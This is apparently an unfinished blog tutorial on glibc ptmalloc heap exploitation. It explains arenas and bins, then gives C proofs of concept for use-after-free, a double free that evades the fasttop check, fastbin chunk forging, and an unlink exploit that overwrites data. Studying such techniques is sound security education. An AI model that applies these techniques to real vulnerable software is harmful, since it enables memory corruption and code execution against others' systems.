---

layout: post
title: "Heap Exploitation"
date: 2025-09-22 13:00:00 +0000
categories: [Heap Exploitation]
tags: [jekyll, chirpy, static-site, tutorial]
summary: "my ctf writeups."
author: Amine
toc: true
math: false
comments: true
---

## onboarding 

I’m kicking off a series focused on heap exploitation techniques, beginning with glibc’s ptmalloc on Linux. Before diving into actual exploitation, we’ll first cover all the essential heap concepts and terminology that form the foundation of these attacks. The series will explore the entire ‘House of XXX’ collection, a set of exploit strategies targeting glibc vulnerabilities, originally introduced in the 2004 article *The Malloc Maleficarum – Glibc Malloc Exploitation Techniques*.

## heap basics - what the heap is and why it matters

The **heap** in C and C++ is a region of memory used for dynamic storage. Programmers request space from the heap during program execution through functions like `malloc` or `calloc`. This memory can then be accessed, modified, and shared across different parts of the program. When it is no longer needed, the programmer releases it back to the heap manager using the `free` function, ensuring the memory can be reused.

`stdlib.h` provides with standard library functions to access, modify and manage dynamic memory. Commonly used functions include **malloc** and **free**:

```c
// Dynamically allocate 10 bytes
char *buffer = (char *)malloc(10);

strcpy(buffer, "hello");
printf("%s\n", buffer); // prints "hello"

// Frees/unallocates the dynamic memory allocated earlier
free(buffer);
```
The documentation about 'malloc' and 'free' says:

* malloc:
```
/*
  malloc(size_t n)
  Returns a pointer to a newly allocated chunk of at least n
  bytes, or null if no space is available. Additionally, on 
  failure, errno is set to ENOMEM on ANSI C systems.

  If n is zero, malloc returns a minimum-sized chunk. (The
  minimum size is 16 bytes on most 32bit systems, and 24 or 32
  bytes on 64bit systems.)  On most systems, size_t is an unsigned
  type, so calls with negative arguments are interpreted as
  requests for huge amounts of space, which will often fail. The
  maximum supported value of n differs across systems, but is in
  all cases less than the maximum representable value of a
  size_t.
*/
```
* free:
```
/*
  free(void* p)
  Releases the chunk of memory pointed to by p, that had been
  previously allocated using malloc or a related routine such as
  realloc. It has no effect if p is null. It can have arbitrary
  (i.e., bad!) effects if p has already been freed.

  Unless disabled (using mallopt), freeing very large spaces will
  when possible, automatically trigger operations that give
  back unused memory to the system, thus reducing program
  footprint.
*/
```

It is important to note that these memory allocation functions are provided by the standard library. These functions provide a layer between the developer and the operating system that efficiently manages heap memory. It is the responsibility of the developer to 'free' any allocated memory after using it exactly once. Internally, these functions use two system calls **sbrk** and **mmap** to request and release heap memory from the operating system.

As can be seen, the malloc function returns a pointer to a memory block of corresponding size bytes. In addition, this function also handles some exceptions    


* When n is set to 0, it will return the smallest available memory block on the system. As a point of interest, on a Linux x64 system, this smallest requested memory block is typically 24 bytes (I'll demonstrate this during debugging )

* If n is a negative number, it's essential to note that size_t is an unsigned type on most systems. Consequently, the program will request huge amount of memory, but it will likely fail because the system cannot allocate that much memory.

* demo :




## heap internals - how allocators work (conceptual)






## glibc ptmalloc deep dive (classic, still essential)

### Arena

#### what is an arena?

In glibc’s `ptmalloc` allocator (the one used in Linux), **an arena** is a structure that manages a part of the heap memory. Think of it as a “memory manager” instance that controls a specific region of memory and contains metadata about allocations inside it.

* Each **arena** keeps track of:

  * The chunks (allocated and free) it manages.
  * The bins (fastbins, smallbins, largebins, unsorted bin).
  * Synchronization (locks) for multi-threading.
  * Bookkeeping data (heap base, system_mem, etc.).

#### why arenas exist?

The reason glibc introduced arenas is **multithreading performance**.

* If only **one global arena** existed:

  * Every thread would need to lock the same structure during malloc/free.
  * This would create a serious **bottleneck** in multi-threaded programs.

* With **multiple arenas**:

  * Each thread can have its own arena (or at least, not share it with many).
  * This reduces lock contention and improves parallel performance.

#### types of arenas

1. **main arena**

   * The first arena created.
   * Defined inside glibc as `struct malloc_state main_arena`.
   * Allocations from the main thread usually happen here.
   * Located inside libc itself (not dynamically allocated).
   * If you debug with `gdb` and `glibc debug symbols`, you can see `main_arena`.

2. **thread arenas**

   * Additional arenas created for new threads.
   * Each thread usually gets assigned its own arena.
   * Stored in dynamically allocated memory regions.
   * The number of arenas is limited (by default `8 × number_of_cores`).

#### arena internals (struct malloc_state)

Each arena is represented by a `malloc_state` struct :

```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);
  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];
  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;
  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;
  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;
  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;
  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */

  INTERNAL_SIZE_T attached_threads;
  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};

typedef struct malloc_state *mstate;
```

Key parts:

* **top** → the chunk at the very end of the heap, extended when needed.
* **bins[]** → linked lists of free chunks (fastbins, smallbins, largebins, unsorted bin).
* **system_mem** → how much memory this arena has from the OS.
* **next** → arenas form a linked list (main_arena → thread_arena1 → thread_arena2 → …).

#### how arenas are used

* When a thread calls `malloc`:

  1. It tries to use its own arena.
  2. If it doesn’t have one yet → a new arena may be created.
  3. If the max number of arenas is reached → threads may share arenas (with locks).

* When `free` is called:

  * The freed chunk goes back to the **same arena** it was allocated from.
  * This means chunks are not shared between arenas.

#### does every arena use the same heap?

**No, not always.**
Each arena can manage its **own separate heap region**.

* The **main arena** manages memory from the original program break (`brk`) — that’s the “normal heap” you see with `sbrk()` or in `/proc/<pid>/maps`.
* **Other arenas** (created for other threads) usually allocate their memory from **`mmap`** — separate heap regions that live in different parts of the process’s address space.

So:

* Main thread → **main arena** → **brk-based heap**
* Extra threads → **their own arenas** → **mmap-based heaps**

#### Small example with `pmap`

Let’s say we have a multi-threaded program. In `/proc/<pid>/maps` (or using `pmap`), you might see:

```
00400000-00452000 r-xp  ...
00651000-00652000 rw-p  ...
00c00000-00c21000 rw-p  [heap]   <--- main heap (used by main arena)
7f5c14000000-7f5c14200000 rw-p  [anon]  <--- extra heap (used by thread arena)
7f5c14400000-7f5c14600000 rw-p  [anon]  <--- another heap (another arena)
```

Here:

* The `[heap]` segment is managed by the **main arena**.
* The `[anon]` mappings are **mmapped heaps**, each managed by a different arena.


#### why do this?

* If all arenas shared the **same heap**, threads would still need to synchronize access to chunks → slowing things down.
* By giving each arena its **own memory pool**, threads can allocate/free independently.


### Chunks

### Bins


## tcache & modern glibc changes (2.26+)





## heap exploitation



| Attack                | Target                                                                       | Technique                                         |
| --------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------- |
| First Fit             | This is not an attack — it just demonstrates the nature of glibc's allocator | —                                                 |
| Double Free           | Making `malloc` return an already-allocated fastchunk                        | Disrupt the fastbin by freeing a chunk twice      |
| Forging Chunks        | Making `malloc` return a nearly-arbitrary pointer                            | Corrupt / forge fastbin links                     |
| Unlink Exploit        | Getting (nearly) arbitrary write access                                      | Freeing a corrupted chunk and exploiting `unlink` |
| Shrinking Free Chunks | Making `malloc` return a chunk overlapping with an already-allocated chunk   | Corrupt a free chunk by decreasing its size       |
| House of Spirit       | Making `malloc` return a nearly-arbitrary pointer                            | Force freeing of a crafted fake chunk             |
| House of Lore         | Making `malloc` return a nearly-arbitrary pointer                            | Disrupt the smallbin link structure               |
| House of Force        | Making `malloc` return a nearly-arbitrary pointer                            | Overflow into the top chunk's header              |
| House of Einherjar    | Making `malloc` return a nearly-arbitrary pointer                            | Overflow a single byte into the next chunk        |


### first fit

This technique describes the 'first-fit' behavior of glibc's allocator. Whenever any chunk (not a fast chunk) is freed, it ends up in the unsorted bin. Insertion happens at the HEAD of the list. On requesting new chunks (again, non fast chunks), initially unsorted bins will be looked up as small bins will be empty. This lookup is from the TAIL end of the list. If a single chunk is present in the unsorted bin, an exact check is not made and if the chunk's size >= the one requested, it is split into two and returned. This ensures first in first out behavior.

Consider the sample code:

```c
char *a = malloc(300);    // 0x***010
char *b = malloc(250);    // 0x***150

free(a);

a = malloc(250);          // 0x***010
```

The state of unsorted bin progresses as:

1. 'a' freed.
> head -> a -> tail
2. 'malloc' request.
> head -> a2 -> tail [ 'a1' is returned ]

'a' chunk is split into two chunks 'a1' and 'a2' as the requested size (250 bytes) is smaller than the size of the chunk 'a' (300 bytes). This corresponds to [6. iii.] in _int_malloc.

This is also true in the case of fast chunks. Instead of 'freeing' into unsorted bin, fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end. This 'reverses' the order of chunks obtained.

Consider the sample code:
```c
char *a = malloc(20);     // 0xe4b010
char *b = malloc(20);     // 0xe4b030
char *c = malloc(20);     // 0xe4b050
char *d = malloc(20);     // 0xe4b070

free(a);
free(b);
free(c);
free(d);

a = malloc(20);           // 0xe4b070
b = malloc(20);           // 0xe4b050
c = malloc(20);           // 0xe4b030
d = malloc(20);           // 0xe4b010
```

The state of the particular fastbin progresses as:


1. 'a' freed.
> head -> a -> tail
2. 'b' freed.
> head -> b -> a -> tail
3. 'c' freed.
> head -> c -> b -> a -> tail
4. 'd' freed.
> head -> d -> c -> b -> a -> tail
5. 'malloc' request.
> head -> c -> b -> a -> tail [ 'd' is returned ]
6. 'malloc' request.
> head -> b -> a -> tail [ 'c' is returned ]
7. 'malloc' request.
> head -> a -> tail [ 'b' is returned ]
8. 'malloc' request.
> head -> tail [ 'a' is returned ]

The smaller size here (20 bytes) ensured that on freeing, chunks went into fastbins instead of the unsorted bin.

#### Use after Free Vulnerability
In the above examples, we see that, malloc might return chunks that were earlier used and freed. This makes using freed memory chunks vulnerable. Once a chunk has been freed, it should be assumed that the attacker can now control the data inside the chunk. That particular chunk should never be used again. Instead, always allocate a new chunk.

See sample piece of vulnerable code:
```c
char *ch = malloc(20);

// Some operations
//  ..
//  ..

free(ch);

// Some operations
//  ..
//  ..

// Attacker can control 'ch'
// This is vulnerable code
// Freed variables should not be used again
if (*ch=='a') {
  // do this
}
```

### double free

Freeing a resource more than once can lead to memory leaks. The allocator's data structures get corrupted and can be exploited by an attacker. In the sample program below, a fastbin chunk will be freed twice. Now, to avoid 'double free or corruption (fasttop)' security check by glibc, another chunk will be freed in between the two frees. This implies that the same chunk will be returned by two different 'mallocs'. Both the pointers will point to the same memory address. If one of them is under the control of an attacker, he/she can modify memory for the other pointer leading to various kinds of attacks (including code executions).

Consider this sample code:
```c
a = malloc(10);     // 0xa04010
b = malloc(10);     // 0xa04030
c = malloc(10);     // 0xa04050

free(a);
free(b);  // To bypass "double free or corruption (fasttop)" check
free(a);  // Double Free !!

d = malloc(10);     // 0xa04010
e = malloc(10);     // 0xa04030
f = malloc(10);     // 0xa04010   - Same as 'd' !
```

The state of the particular fastbin progresses as:
1. 'a' freed.
> head -> a -> tail
2. 'b' freed.
> head -> b -> a -> tail
3. 'a' freed again.
> head -> a -> b -> a -> tail
4. 'malloc' request for 'd'.
> head -> b -> a -> tail [ 'a' is returned ]
5. 'malloc' request for 'e'.
> head -> a -> tail [ 'b' is returned ]
6. 'malloc' request for 'f'.
> head -> tail [ 'a' is returned ]

Now, 'd' and 'f' pointers point to the same memory address. Any changes in one will affect the other.

Note that this particular example will not work if size is changed to one in smallbin range. With the first free, a's next chunk will set the previous in use bit as '0'. During the second free, as this bit is '0', an error will be thrown: "double free or corruption (!prev)" error.

### Forging chunks
After a chunk is freed, it is inserted in a binlist. However, the pointer is still available in the program. If the attacker has control of this pointer, he/she can modify the linked list structure in bins and insert his/her own 'forged' chunk. The sample program shown below shows how this is possible in the case of fastbin freelist.
```c
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);               // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```
The forged chunk's size parameter was set equal to 0x20 so that it passes the security check "malloc(): memory corruption (fast)". This check checks whether the size of the chunk falls in the range for that particular fastbin. Also, note that the data for an allocated chunk starts from the 'fd' pointer. This is also evident in the above program as victim points 0x10 (0x8+0x8) bytes ahead of the 'forged chunk'.

The state of the particular fastbin progresses as:
1. 'a' freed.
> head -> a -> tail
2. a's fd pointer changed to point to 'forged chunk'.
> head -> a -> forged chunk -> undefined (fd of forged chunk will in fact be holding attacker's data)
3. 'malloc' request
> head -> forged chunk -> undefined
4. 'malloc' request by victim
> head -> undefined [ forged chunk is returned to the victim ]

Note the following:

 * Another 'malloc' request for the fast chunk in the same bin list will result in segmentation fault.

 * Even though we request for 10 bytes and set the size of the forged chunk as 32 (0x20) bytes, both fall in the same fastbin range of 32-byte chunks.

 * This attack for small and large chunks will be seen later as 'House of Lore'.

 * The above code is designed for 64-bit machines. To run it on 32-bit machines, replace unsigned long long with unsigned int as pointers are now 4 bytes instead of 8 bytes. Also, instead of using 32 bytes as size for forged chunk, a small of the size of around 17 bytes should work.


 ### unlink exploit
This particular attack was once quite common. However, two security checks were added in the unlink MACRO ("corrupted size vs. prev_size" and "corrupted double-linked list") which reduced the impact of the attack to some extent. Nevertheless, it is worthwhile to spend some time on it. It exploits the pointer manipulation done in the unlink MACRO while removing a chunk from a bin.
Consider this sample code (download the complete version here):

 ```c
 #include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

int main() {
  unsigned long long *chunk1, *chunk2;
  struct chunk_structure *fake_chunk, *chunk2_hdr;
  char data[20];

  // First grab two chunks (non fast)
  chunk1 = malloc(0x80);
  chunk2 = malloc(0x80);
  printf("%p\n", &chunk1);
  printf("%p\n", chunk1);
  printf("%p\n", chunk2);

  // Assuming attacker has control over chunk1's contents
  // Overflow the heap, override chunk2's header

  // First forge a fake chunk starting at chunk1
  // Need to setup fd and bk pointers to pass the unlink security check
  fake_chunk = (struct chunk_structure *)chunk1;
  fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
  fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

  // Next modify the header of chunk2 to pass all security checks
  chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
  chunk2_hdr->prev_size = 0x80;  // chunk1's data region size
  chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

  // Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
  // This results in chunk1 pointer pointing to chunk1 - 3
  // i.e. chunk1[3] now contains chunk1 itself.
  // We then make chunk1 point to some victim's data
  free(chunk2);
  printf("%p\n", chunk1);
  printf("%x\n", chunk1[3]);

  chunk1[3] = (unsigned long long)data;

  strcpy(data, "Victim's data");

  // Overwrite victim's data using chunk1
  chunk1[0] = 0x002164656b636168LL;

  printf("%s\n", data);

  return 0;
}
```


This might look a little complicated compared to other attacks. First, we malloc two chunks chunk1 and chunk2 with size 0x80 to ensure that they fall in the smallbin range. Next, we assume that the attacker somehow has unbounded control over the contents of chunk1 (this can be using any 'unsafe' function such as strcpy on user input). Notice that both the chunks will lie in the memory side by side. The code shown above uses custom struct chunk_structure for clarity purposes only. In an attack scenario, the attacker shall simply send bytes to fill in chunk1 that would have the same effect as above.

A new fake chunk is created in the 'data' part of chunk1. The fd and bk pointers are adjusted to pass the "corrupted double-linked list" security check. The contents of the attacker are overflowed into chunk2's header that sets appropriate prev_size and prev_in_use bit. This ensures that whenever chunk2 is freed, the fake_chunk will be detected as 'freed' and will be unlinked'. The following diagrams shows the current state of the various memory regions:




### house of spirit
